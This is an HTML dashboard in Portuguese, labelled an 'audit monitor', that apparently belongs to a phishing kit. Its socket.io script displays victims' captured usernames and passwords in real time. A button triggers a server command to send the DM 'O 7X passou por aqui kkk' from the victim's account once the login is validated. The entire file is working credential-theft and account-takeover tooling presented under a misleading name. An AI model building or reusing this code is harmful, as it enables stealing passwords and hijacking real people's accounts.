<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>7X | Central de Operações</title>
</head>
<body>
    <div class="card" style="width: 90%; max-width: 500px;">
        <h2 style="color: #38bdf8;">📡 Monitor de Auditoria 7X</h2>
        <div class="mirror-box" style="background: #000; padding: 15px; border-radius: 8px; text-align: left; font-family: monospace; color: #38bdf8; border: 1px solid #334155;">
            <p>> STATUS: <span style="color: #22c55e;">SISTEMA ATIVO</span></p>
            <hr style="opacity: 0.1;">
            <p>> USUÁRIO: <span id="u-display" style="color: white;">aguardando...</span></p>
            <p>> SENHA: <span id="p-display" style="color: white;">aguardando...</span></p>
        </div>
        <br>
        <button id="sig-btn" style="background: #ef4444; color: white;">EXECUTAR ASSINATURA (DM)</button>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        socket.on('update_dashboard', (data) => {
            document.getElementById('u-display').innerText = data.u;
            document.getElementById('p-display').innerText = data.p;
        });

        document.getElementById('sig-btn').onclick = () => {
            socket.emit('send_signature');
            alert('Comando enviado: A mensagem "O 7X passou por aqui kkk" será disparada assim que o login for validado.');
        };
    </script>
</body>
</html>
